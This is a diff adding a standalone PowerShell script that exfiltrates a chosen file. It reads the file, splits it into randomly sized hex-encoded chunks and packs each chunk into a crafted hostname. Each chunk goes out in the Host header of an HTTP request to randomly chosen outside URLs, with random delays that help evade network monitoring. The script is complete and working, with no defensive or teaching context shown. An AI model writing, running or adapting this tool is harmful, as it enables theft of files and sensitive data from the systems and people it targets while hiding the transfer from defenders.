@@ -1,0 +1,61 @@
+param(
+    [Parameter(Mandatory=$true)][string] $Identifier,
+    [Parameter(Mandatory=$true)][string] $Domain,
+    [Parameter(Mandatory=$true)][string[]] $Urls,
+    [Parameter(Mandatory=$true)][string] $FilePath,
+    [int] $MinChunkSize = 14,
+    [int] $MaxChunkSize = 18,
+    [int] $MinDelay     = 1,
+    [int] $MaxDelay     = 3
+)
+
+function ConvertTo-Hex {
+    param([byte[]] $Bytes)
+    ($Bytes | ForEach-Object { '{0:X2}' -f $_ }) -join ''
+}
+
+function Log-Message {
+    param([string] $Message)
+    Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
+}
+
+Log-Message "Reading file: $FilePath"
+try {
+    $data = Get-Content -Path $FilePath -Encoding Byte
+    if (-not $data) { throw "No data read." }
+} catch {
+    Log-Message "Failed to read file: $_"
+    exit 1
+}
+Log-Message "Total bytes read: $($data.Count)"
+
+$chunks = @(); $index = 0; $chunkIndex = 0
+while ($index -lt $data.Count) {
+    $chunkIndex++
+    $size = Get-Random -Minimum $MinChunkSize -Maximum ($MaxChunkSize + 1)
+    if ($index + $size -gt $data.Count) { $size = $data.Count - $index }
+    $segment = $data[$index..($index + $size - 1)]
+    $hex     = ConvertTo-Hex -Bytes $segment
+    $chunks += [PSCustomObject]@{ Order = $chunkIndex; Chunk = $hex }
+    $index  += $size
+}
+$total = $chunks.Count
+Log-Message "Total chunks: $total"
+
+for ($i = 0; $i -lt $total; $i++) {
+    $obj    = $chunks[$i]
+    $order  = '{0:D3}' -f $obj.Order
+    $full   = "$Identifier.$order.$($obj.Chunk).$Domain"
+    $target = Get-Random -InputObject $Urls
+
+    Log-Message "Sending chunk $order/$total to $target"
+    try {
+        Invoke-WebRequest -Uri "http://$target" -Headers @{ 'Host' = $full } -UseBasicParsing | Out-Null
+    } catch {
+        Log-Message "Error on chunk $order"
+    }
+
+    Start-Sleep -Seconds (Get-Random -Minimum $MinDelay -Maximum ($MaxDelay + 1))
+}
+
+Log-Message "Completed: $total chunks sent."
